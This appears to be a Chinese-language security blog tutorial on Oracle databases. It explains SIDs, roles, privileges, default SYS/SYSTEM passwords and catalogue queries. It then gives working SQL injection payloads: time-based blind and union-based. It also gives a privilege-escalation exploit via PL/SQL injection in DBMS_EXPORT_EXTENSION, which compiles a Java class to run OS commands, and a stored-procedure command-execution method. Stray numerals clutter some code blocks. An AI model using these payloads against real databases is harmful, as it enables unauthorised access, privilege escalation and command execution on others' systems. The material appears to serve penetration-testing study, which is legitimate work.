**目录**

[Oracle数据库](#t0)

[Oracle常用命令](#t1)

[Oracle中的SID](#t2)

[Oracle中的一些Name的含义](#t3)

[Oracle的权限管理(用户、角色和权限)](#t4)

[Oracle的连接](#t5) 

[Oracle执行操作系统命令](#t6)

[时间盲注](#t7)

[Union联合注入](#t8)

[Oracle提权](#t9)

[Java权限执行命令](#t10)

[存储过程执行命令](#t11)

* * *

Oracle数据库
---------

Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文的一款关系型数据库。它在数据库领域一直处于领先地位。可以说Oracle数据库系统是目前世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的、适应高吞吐量的数据库方案。

*   Oracle的单行注释符号是 -- ， 多行注释符号  /\*\*/
*   Oracle数据库文件的后缀名是 .dbf 和  .ora ，默认是 .dbf
*   Oracle数据库默认表：dual

![](https://img-blog.csdnimg.cn/20200102233318229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### Oracle常用命令

```
查看当前角色      
select * from session_roles       
查看当前用户      
SELECT user FROM dual        
select SYS_CONTEXT ('USERENV', 'CURRENT_USER') from dual             
查看数据库的版本信息                                          
select banner from sys.v_$version where rownum=1        
查看服务器监听IP                  
select utl_inaddr.get_host_address from dual      1
查询数据库文件的路径      1
SELECT name FROM V$DATAFILE;      1
查看日志文件路径                                             1
select member from v$logfile where rownum=1;       1
查看实例名                                       1
select instance_name from v$instance            1
查询当前用户可以访问的所有数据字典视图      1
select * from dict where comments like '%grant%';        1
查询字符ASCII值      2
select ASCII('a') from dual      2
ASCII值转字符串      2
select chr(97) from dual      2
select chr(97)||chr(100) from dual      2
查看字符串长度      2
select length('string') from dual      2
截取字符串      2
select substr('string',2,3) from dual       2
查看当前数据库名      3
SELECT name FROM v$database;      3
select * from global_name;        3
查看当前数据库详细信息      3
SELECT * FROM v$database;         3
查看所有表的表名      3
select table_name from all_tables;        3
查看用户表中的表名          3
select table_name from user_tables;                                 3
查看所有表的详细信息      3
select * from all_tables;                                            4
查看表的字段                                   4
select column_name from all_tab_columns where TABLE_NAME='表名'      4
select column_name from 当前数据库  where TABLE_NAME='表名'       4
查看具体数据            4
select 字段1||'='||字段2||'='||字段3  from 具体表名
```


### Oracle中的SID

这里的SID是System IDentifier的缩写，而ORACLE\_SID就是Oracle System Identifier的缩写，也就是Oracle数据库的唯一系统标识符，是建立一个数据库时系统自动赋予的一个初始ID。在Oracle系统中，ORACLE\_SID以环境变量的形式出现，在特定版本的Oracle软件安装（也就是ORACLE\_HOME）下，当Oracle实例启动时，操作系统上fork的进程必须通过这个SID将实例与其他实例区分开来，这就是SID的作用。

Oracle的sid在不同的系统环境下，查看方式不相同，方法分别如下：  
**1：windows 下查看注册表**  
开始 输入regedit 查看

```
HKEY_LOCAL_MACHINE\SOFTWARE\ORACLE\KEY_OraDb11g_home1\ORACLE_SID
```


**2：linux下使用以下命令查看**

```
echo $ORACLE_SID               #注意：ORACLE_SID要大写
```


![](https://img-blog.csdnimg.cn/20200103133746465.png)  
**3：在sql命令下可以查看**  
连接后执行以下命令查询实例名(实例名=SID)

```
select instance_name from v$instance;      
select * from v$instance;               #查看实例详细信息
```


![](https://img-blog.csdnimg.cn/20200103135250851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### Oracle中的一些Name的含义

*   **操作系统环境变量（ORACLE\_SID）：**instance\_name（“数据库实例名”）是Oracle的数据库参数，而oracle\_sid则是操作系统的环境变量，用户和操作系统交互，也就是说要得到实例名，必须使用sid。在数据库安装结束时 ，oracle\_sid已经是一个确定的字符串了，其值必须与数据库实例名相同。
*   **数据库实例名（INSTANCE\_NAME）：**实例名用于和操作系统关联，在操作系统中要取得与数据库之间的交互必须使用数据库实例名。（这里要知道什么是实例，简单的说就是内存和一些后台进程。）数据库名一般与实例名是一一对应的。但在Oracle的并行服务结构中却不是，数据库与实例是一对多的关系。
*   **数据库名（DB\_NAME ）**：是用于区分一个数据的内部标示，即Oracle数据库的内部表示。是以二进制方式存储于数据库的控制文件的参数。在数据库安装或创建之后不得修改。
*   **数据库域名（DB\_DOMAIN）：**在Oracle10g中db\_domain表示域名。与数据库名，数据库实例名一样数据库域名在安装数据库时候已经确定。ll.xxx.com.cn。后面的xxx.com.cn则表示域名。
*   **全局数据库名（GLOBAL\_NAME）：**则表示数据库名和域名的总和。如果没有域名，全局数据库名就与数据库名相同。
*   **数据库服务名（SERVICE\_NAME）：**是从oracle 9i，10g开始引入的参数。用service\_names表示。数据库服务名与全局数据库名相同。

### Oracle的权限管理(用户、角色和权限)

![](https://img-blog.csdnimg.cn/20200104102118658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

用户拥有角色，角色是权限的集合，一个角色也可以属于另一个角色。

对于普通用户：授予 connect、resource 角色。  
对于管理用户：授予 connect、resource、dba 角色。

**Oracle常见的两个用户：**

*   Sys用户：所有Oracle的数据字典的基表和视图都存放在Sys用户中，这些基表和视图对于Oracle的运行是非常重要的，由数据库自己维护，任何用户都不能手动更改。Sys用户拥有dba，sysdba，sysoper角色和权限，是Oracle权限最高的用户，类似于公司董事长，而System用户类似于公司总经理。
*   System用户：用于存放次一级的内部数据，如Oracle的一些特性或工具的管理信息。System用户拥有dba角色的权限。

这两个用户的默认密码：

*   用户名：sys         密码：CHANGE\_ON\_INSTALL
*   用户名：system   密码：MANAGER

```
create user hack identified by "Password@";  #创建hack用户，密码为：Password@      
drop user hack cascade;                      #删除hack用户，加上cascade则将用户连同其创建的东西全部删除      
alter user 用户名 account unlock;              #解锁登录账号      
alter user 用户名 account lock;                #冻结登录账号      
alter user 用户名 identified by "密码";        #修改用户名的密码
```


**Oracle常见的三种角色：**

*   DBA：拥有全部权限，拥有DBA角色的用户拥有系统最高权限，只有拥有DBA角色的用户才可以创建数据库结构。
*   Resource：拥有Resource角色的用户只可以创建实体，不可以创建数据库结构。
*   Connect：拥有Connect角色的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构。

**Oracle系统提供两类权限：**

*   System系统权限：系统规定用户使用数据库的权限。（系统权限是对用户而言)
*   Object对象权限：某种权限用户对其它用户的表或视图的存取权限。（是针对表或视图而言的）

**Oracle中常见的系统权限：**

*   Sysdba权限**：**最高的系统权限，sysdba，是管理Oracle实例的，它的存在不依赖于整个数据库完全启动，只要实例启动了，他就已经存在，以sysdba身份登陆，装载数据库、打开数据库。当使用命令 conn / as sysdba 连接数据库，这时候，其实我们是以Sysdba这个身份去登陆数据库的，我们当前的default schema是Sys。**Sysdba可以访问V$对象视图**
*   Sysoper权限**：**也是一种系统权限，只不过跟sysdba略有区别而已。当使用conn /as sysoper 这种连接下，我们的default schema是public。

这些权限可以授予给用户、特殊用户public 或 角色 ，如果授予一个权限给特殊用户Public（特殊用户public是Oracle预定义的，其他每个用户享有Public这个用户享有的权限），那么就意味着将该public用户的权限授予给了该数据库的所有用户。

对管理权限而言，角色是一个工具，权限能够被授予给一个角色，角色也能被授予给另一个角色或用户。那么什么是角色呢?可以简单的认为一个角色就是某些个权限的集合体，也就是说把多个系统权限（system privilege)，对象权限（object privilege)以及角色（role)揉和在一起，然后赋给一个角色。说白了，Oracle引入角色的概念，其实是为了避免相关的系统权限和对象权限的赋予和回收的复杂性。把一堆系统权限和对象权限以及角色打包之后赋给某个新角色，然后再对这个新角色进行必要的操作就显得相当便捷和方便了。当然，在Oracle里面一个角色是可以赋给另外一个角色的，但是角色的赋给是不能够构成循环回路的。例如:先把role1给role2,然后把role2给role3,那么你就不可以再把role3给role1了。这是Oracle不允许的！只有数据库打开了，或者说整个数据库完全启动后，dba角色才有了存在的基础。用户可以通过角色继承权限，除了管理权限外角色服务没有其它目的。权限可以被授予，也可以用同样的方式撤销。

**角色授权，移除命令**  
角色只能由DBA用户授出：sys, system (最开始只能是这两个用户)

```
create user hack identified by "Password@";        #创建用户hack，密码：Password@      
grant connect,resource,dba to hack;                #授予hack用户connect,resource,dba角色      
grant connect,resource,dba to hack with admin option;  #增加WITH ADMIN OPTION选项，则得到的角色可以传递。      
Revoke connect,resource,dba from hack;             #移除hack用户connect,resource,dba角色      
drop user hack cascade;                            #删除hack用户，加上cascade则将用户连同其创建的东西全部删除       
说明：       
1）如果使用WITH ADMIN OPTION为某个用户授予角色，那么对于被这个用户授予相同角色的所有用户来说，取消该用户的角色并不会级联取消这些用户的相同权限。      
2）系统权限无级联，即A授予B权限，B授予C权限，如果A收回B的权限，C的权限不受影响；系统权限可以跨用户回收，即A可以直接收回C用户的权限。
```


![](https://img-blog.csdnimg.cn/20200103221639424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
注：普通用户通过授权可以具有与system相同的用户权限，但永远不能达到与sys用户相同的权限，system用户的权限也可以被回收。 

**查看用户**

```
select * from user_users;        #查看当前用户      
select * from all_users;         #查看所有用户      
select * from dba_role_privs where grantee='大写的用户名';      #查看某个用户具有什么样的角色        
select grantee from dba_role_privs where granted_role='DBA';   #查看哪些用户具有DBA角色
```


![](https://img-blog.csdnimg.cn/20200103235011570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200104004212241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**查看角色**

```
select * from dba_roles;                #查看所有角色      
select * from session_roles;            #查看当前用户被激活的角色      
select * from user_role_privs;          #当前当前用户被授予的角色       
select * from dba_role_privs where grantee='大写的用户名';       #查看某个用户所拥有的角色      
select * from dba_sys_privs where grantee='大写的角色名';        #查看某个角色所拥有的系统权限      
select * from dba_tab_privs where grantee='大写的角色名'         #查看某个角色所拥有的对象权限
```


![](https://img-blog.csdnimg.cn/20200104001531117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200104153930555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200104154508327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**查看权限**

```
1.基本权限查询：      
select * from session_privs;         #查看当前用户所拥有的全部权限      
select * from role_sys_privs;        #查看当前用户角色所包含的权限       
select * from dba_sys_privs;         #查看当前用户的系统权限(直接赋值给用户或角色的系统权限)      
select * from user_sys_privs;        #查看Sys用户所拥有的权限       
2.查看用户的对象权限：      
select * from all_tab_privs;      1
select * from user_tab_privs;      1
select * from dba_tab_privs;       1
3.查看哪些用户有sysdba或sysoper系统权限(查询时需要相应权限)      1
select * from v$pwfile_users;        1
4.查看oracle提供的系统权限      1
select name from sys.system_privilege_map       1
5.查看知道TEST用户的所有系统权限      2
select privilege from dba_sys_privs where grantee='TEST' union select privilege from dba_sys_privs where grantee in (select granted_role from dba_role_privs where grantee='TEST');
```


![](https://img-blog.csdnimg.cn/20200104153629207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200104003232146.png)

![](https://img-blog.csdnimg.cn/20200104003525372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

参考文章：[Oracle权限管理详解](https://www.cnblogs.com/yw0219/p/5855210.html) 

### Oracle的连接 

**命令行连接**

```
sqlplus /nolog          #进入oracle数据库管理，加上 /nolog 就不用输入用户名密码      
conn /as sysdba         #以sys用户dba权限连接
```


![](https://img-blog.csdnimg.cn/20200103223509880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**使用Navicat远程连接Oracle数据库**

![](https://img-blog.csdnimg.cn/20200103133404595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### Oracle执行操作系统命令

**Linux系统**

在系统命令前面加上!，但是因为 Oracle 必须为非 root 用户， 所以很多命令可能无法执行。

![](https://img-blog.csdnimg.cn/20200103214623156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**Windows系统**

在命令的前面加上 host 

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNDg1MTk2LzIwMTkwMS80ODUxOTYtMjAxOTAxMTAxNzEyMDMzNTAtOTQyNTcxMDk3LnBuZw?x-oss-process=image/format,png)

时间盲注
----

```
select*from LOCATIONS WHERE LOCATION_ID=1000 and 1=dbms_pipe.receive_message('RDS', 3)
```


![](https://img-blog.csdnimg.cn/20200307220658569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Union联合注入
---------

Oracle 在使用 union 查询的时候跟 MySQL 不一样，MySQL里面用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你 union select 的要和前面的字段类型一样，我们可以用 null 来代替站位。  
Oracle 和 MySQL 不一样，分页中没有 limit，而是使用三层查询嵌套的方式实现分页(查询第一条数据“>=0<=1”) 例如:

```
当使用这条命令查询当前用户的角色，一般会有很多行数据      
select * from session_roles      
我们这里只显示第一行数据，可以如下      
SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM <=1  ) WHERE RN >= 1      
只显示第二行数据      
SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM <=2  ) WHERE RN >= 2      
只显示第三行数据      
SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM <=3) WHERE RN >= 3      
以此类推
```


首先使用order by 判断列数，如下判断列数是6

```
select*from LOCATIONS WHERE LOCATION_ID=1000 order by 6
```


然后将其中的查询语句换成其他查询信息语句即可 

```
select*from LOCATIONS WHERE LOCATION_ID=1000 union select null,null,(select banner from sys.v_$version where rownum=1),null,null,null from dual
```


 ![](https://img-blog.csdnimg.cn/20200307210951861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Oracle提权
--------

### Java权限执行命令

*   影响版本：Oracle 8.1.7.4、9.2.0.1-9.2.0.7、10.1.0.2-10.1.0.4、10.2.0.1-10.2.0.2、 XE(Fixed in CPU July 2006)
*   权限：普通权限用户
*   详情：这些软件包有许多易受PL/SQL注入攻击的函数。这些函数由SYS拥有，作为SYS执行并且可由PUBLIC执行。因此，如果SQL注入处于上述任何未修补的Oracle数据库版本中，那么攻击者可以调用该函数并直接执行SYS查询，从而由提权限提权至DBA权限执行命令

1：创建Java库

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args){try{BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'''';END;'';END;--','SYS',0,'1',0) from dual;
```


2：赋予Java权限

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<>'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual;
```


3：创建函数

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name''''''''LinxUtil.runCMD(java.lang.String) return String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual;
```


4：赋予函数执行权限

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--','SYS',0,'1',0) from dual;
```


5：执行系统命令

```
select sys.LinxRunCMD('/bin/bash -c /usr/bin/whoami') from dual;
```


### 存储过程执行命令

如果我们有create procedure权限，而不只是create session这么苦逼时，我们可以创建一个java class然后用创建一个过程来进行调用。

1：首先创建一个java class然后用procedure包装它进行调用

```
create or replace and resolve java source named JAVACMD as      
    import java.lang.*;      
    import java.io.*;      
    public class JAVACMD      
    {      
       public static void execmd(String command) throws IOException      
       {      
               Runtime.getRuntime().exec(command);      
       }      1
   }      1
   /
```


2、创建调用的包

```
create or replace procedure MYJAVACMD(command in varchar) as language java      
    name 'JAVACMD.execmd(java.lang.String)';      
/
```


3、执行系统命令。如果报错了不要紧，是因为代码中没有捕获异常，我们再执行一次即可。

```
EXEC MYJAVACMD('whoami');
```


关于如何在docker中搭建oracle数据库：[docker安装Oracle数据库](https://blog.csdn.net/qq_21137441/article/details/89339257)

参考文章：[Oracle数据库提权](https://www.cnblogs.com/-qing-/p/10768290.html#_label1)

相关文章：[记一次手工注入Oracle数据库](https://blog.csdn.net/csacs/article/details/90145501)

                  [【实战】Oracle注入总结](https://www.cnblogs.com/peterpan0707007/p/8242119.html)